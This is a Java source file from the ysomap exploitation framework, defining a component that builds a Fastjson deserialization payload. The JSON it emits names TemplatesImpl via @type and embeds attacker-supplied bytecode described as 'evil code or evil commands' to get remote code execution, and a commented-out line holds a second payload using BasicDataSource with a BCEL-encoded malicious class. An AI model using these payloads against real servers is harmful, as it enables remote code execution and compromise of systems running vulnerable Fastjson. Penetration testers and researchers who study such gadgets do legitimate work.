package ysomap.bullets.json;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Strings;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@Bullets
@SuppressWarnings({"rawtypes"})
@Authors({Authors.WH1T3P1G})
@Details("适用Fastjson，执行恶意代码")
@Targets({Targets.FASTJSON})
@Dependencies({"fastjson"})
public class TemplatesImplJsonBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
    private String body;

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("body", body);
        TemplatesImpl templates = (TemplatesImpl) bullet.getObject();
        byte[][] codebytes = (byte[][]) ReflectionHelper.getFieldValue(templates, "_bytecodes");
        return "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"a\",\"_tfactory\":{ }," +
                "\"_bytecodes\":[\""+ Strings.base64ToString(codebytes[0]) +"\"]," +
                "\"_outputProperties\":{}}";
//        return "{\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A\"}";
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplJsonBullet();
        bullet.set("body", args[0]);
        return bullet;
    }
}
